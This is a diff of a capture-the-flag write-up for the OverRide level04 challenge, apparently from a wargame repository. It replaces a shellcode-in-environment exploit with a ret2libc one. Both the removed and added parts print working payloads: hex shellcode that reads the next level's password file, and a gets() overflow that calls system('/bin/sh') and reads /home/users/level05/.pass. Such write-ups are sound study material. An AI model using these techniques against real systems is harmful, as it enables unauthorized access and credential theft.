@@ -27,56 +27,54 @@ child is exiting...
 ```
 We can find one excutable file **level04**, who take standard input, he wants some shellcode, but do not anything. \
 \
-Check it with GDB,
-
-```sh
-Breakpoint 1, 0x0804875e in main ()
-(gdb) p/x $eax
-$2 = 0xffffd670
-```
+Check it with GDB, 
 
 After analyzing asm code, we could find buffer overflow-able function ```gets```, but there is also a protection for the ```exec``` system call (syscall number 11). \
 So we have to somehow 1. get the flag without running the ```exec``` 2. and run the exploit code. \
-First let's find the offset of buffer overflow
+and also, there is ```fork()```, so we can't check properly informations of child process, so we have to run some gdb flags ```set follow-fork-mode child```.
+```sh
+(gdb) set follow-fork-mode child
+```
+With that flag, let's find the offset of buffer overflow.
 ```sh
 python3 pattern_generator.py
 === Buffer Overflow Pattern Generator & Offset Finder ===
 Enter the length of the pattern to generate: 200
 Generated pattern (200 bytes):
 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9af0af1af2af3af4af5af6af7af8af9ag0ag1ag2ag3ag4ag5ag
+...
+[New process 3252]
+Give me some shellcode, k
+aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9af0af1af2af3af4af5af6af7af8af9ag0ag1ag2ag3ag4ag5ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 3252]
+---Type <return> to continue, or q <return> to quit---
+0x61326661 in ?? ()
+...
 
 Enter the hex value to find (e.g., 0x63613563): 0x61326661
 Little Endian ASCII representation: 'af2a'
 'af2a' found at offset: 156
 ```
-We could've put our shell code's address at 156 offset, but since it has ```exec``` syscall inside, we are going to use another shell code which will directly give us the flag for the next level
+Now we can redirect our program's flow, i mean EIP, to the system function's address and forcely run the command ```/bin/sh```.
+```System``` and string ```/bin/sh``` are stored somewhere in the standard library:
 ```sh
-export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x86\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
 ```
-This machine code will try to open the file specified at the end of code and directly write it out on the ```stdout```. \
-Also since we exported our shell code we have to find it's address. Let's perform it with writing simple c code ```getenv.c``` which will give us an address we need.
+After getting those values we first put the address of system then ESP+0, that we don't care, cause we don't have to end program properly, then the address of ```/bin/sh``` at the EIP+4, as first argument to system function.
 ```sh
-level04@OverRide:~$ cat /tmp/getenv.c
-#include <stdio.h>
-#include <stdlib.h>
-
-int main()
-{
-    printf("%p\n", getenv("SHELLCODE"));
-}
-level04@OverRide:/tmp$ gcc -m32 /tmp/getenv.c
-level04@OverRide:/tmp$ ./a.out 
-0xffffd8b0
-```
-Note that we are running on x86_64, so we have to compile our program for 32bit to get the address in 32bit format. \
-Now let's try to run our program with our exploit input.
-```sh
-level04@OverRide:~$ python -c 'print "B" * 156 + "\xb0\xd8\xff\xff"' | ./level04 
+level04@OverRide:~$ (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "BBBB" + "\xec\x97\xf8\xf7"'; cat) | ./level04
 Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass
 (hidden)
-child is exiting...
 ```
-level04 passed !
+level04 passed ! 
 
 assmebly analyze
 ---
@@ -160,3 +158,5 @@ Dump of assembler code for function main:
    0x08048825 <+349>:   ret    
 End of assembler dump.
 ```
+
+0xffffd8c2
